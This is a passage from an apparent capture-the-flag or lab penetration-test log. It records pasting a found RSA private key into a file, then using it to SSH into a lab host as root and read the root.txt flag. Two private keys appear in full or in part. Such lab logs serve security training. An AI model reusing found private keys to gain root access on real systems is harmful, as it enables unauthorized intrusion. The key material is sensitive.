+    +LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
+    +JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
+    +oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
+    +xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
+    +vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
+    +6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
+    +OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
+    +4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
+    +937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
+    +SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
+    +Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
+    +eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
+    +i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
+    +6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
+    +8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
+    +RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
+    +qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
+    +T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
+    +bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
+     -----END RSA PRIVATE KEY-----
+
+
+Command-Line: nano unknown_key
+File-Contents:
+    -----BEGIN RSA PRIVATE KEY-----
+    MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+    8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+    vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
+    nz1y2vdO3ug94XX8y0bbMR9Mtpj292wNrxmUSQ5glioqrSrwFfevWt/rEgIVmrb+
+    CCjeERnxMwaZNFP0SYoiC5HweyXD6ZLgFO4uOVuImILGJyyQJ8u5BI2mc/SHSE0c
+    F9DmYwbVqRcurk3yAS+jEbXgObupXkDHgIoMCwIDAQABAoIBAFaUuHIKVT+UK2oH
+    uzjPbIdyEkDc3PAYP+E/jdqy2eFdofJKDocOf9BDhxKlmO968PxoBe25jjjt0AAL
+    gCfN5I+xZGH19V4HPMCrK6PzskYII3/i4K7FEHMn8ZgDZpj7U69Iz2l9xa4lyzeD
+    k2X0256DbRv/ZYaWPhX+fGw3dCMWkRs6MoBNVS4wAMmOCiFl3hzHlgIemLMm6QSy
+    NnTtLPXwkS84KMfZGbnolAiZbHAqhe5cRfV2CVw2U8GaIS3fqV3ioD0qqQjIIPNM
+    HSRik2J/7Y7OuBRQN+auzFKV7QeLFeROJsLhLaPhstY5QQReQr9oIuTAs9c+oCLa
+    2fXe3kkCgYEA367aoOTisun9UJ7ObgNZTDPeaXajhWrZbxlSsOeOBp5CK/oLc0RB
+    GLEKU6HtUuKFvlXdJ22S4/rQb0RiDcU/wOiDzmlCTQJrnLgqzBwNXp+MH6Av9WHG
+    jwrjv/loHYF0vXUHHRVJmcXzsftZk2aJ29TXud5UMqHovyieb3mZ0pcCgYEAxR41
+    IMq2dif3laGnQuYrjQVNFfvwDt1JD1mKNG8OppwTgcPbFO+R3+MqL7lvAhHjWKMw
+    +XjmkQEZbnmwf1fKuIHW9uD9KxxHqgucNv9ySuMtVPp/QYtjn/ltojR16JNTKqiW
+    7vSqlsZnT9jR2syvuhhVz4Ei9yA/VYZG2uiCpK0CgYA/UOhz+LYu/MsGoh0+yNXj
+    Gx+O7NU2s9sedqWQi8sJFo0Wk63gD+b5TUvmBoT+HD7NdNKoEX0t6VZM2KeEzFvS
+    iD6fE+5/i/rYHs2Gfz5NlY39ecN5ixbAcM2tDrUo/PcFlfXQhrERxRXJQKPHdJP7
+    VRFHfKaKuof+bEoEtgATuwKBgC3Ce3bnWEBJuvIjmt6u7EFKj8CgwfPRbxp/INRX
+    S8Flzil7vCo6C1U8ORjnJVwHpw12pPHlHTFgXfUFjvGhAdCfY7XgOSV+5SwWkec6
+    md/EqUtm84/VugTzNH5JS234dYAbrx498jQaTvV8UgtHJSxAZftL8UAJXmqOR3ie
+    LWXpAoGADMbq4aFzQuUPldxr3thx0KRz9LJUJfrpADAUbxo8zVvbwt4gM2vsXwcz
+    oAvexd1JRMkbC7YOgrzZ9iOxHP+mg/LLENmHimcyKCqaY3XzqXqk9lOhA3ymOcLw
+    LS4O7JPRqVmgZzUUnDiAVuUHWuHGGXpWpz9EGau6dIbQaUUSOEE=
+    -----END RSA PRIVATE KEY-----
+
+Command-Line: chmod 600 unknown key
+Command-Line: ssh -i unknown_key root@10.129.1.79
+Result:
+    Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)
+
+     * Documentation:  https://help.ubuntu.com
+     * Management:     https://landscape.canonical.com
+     * Support:        https://ubuntu.com/advantage
+
+    135 packages can be updated.
+    60 updates are security updates.
+
+    Last login: Mon Mar 26 06:23:48 2018 from 192.168.57.1
+    root@gitter:~# cat root.txt
+    d4fe1e7f7187407eebdd3209cb1ac7b3
+    root@gitter:~#
+    *** ROOT ACCESS ***
+
+
+root@gitter:~# cat root.txt
+Result: d4fe1e7f7187407eebdd3209cb1ac7b3
+    *** ROOT OWNED ***
+
+
+      *** FINISHED ***
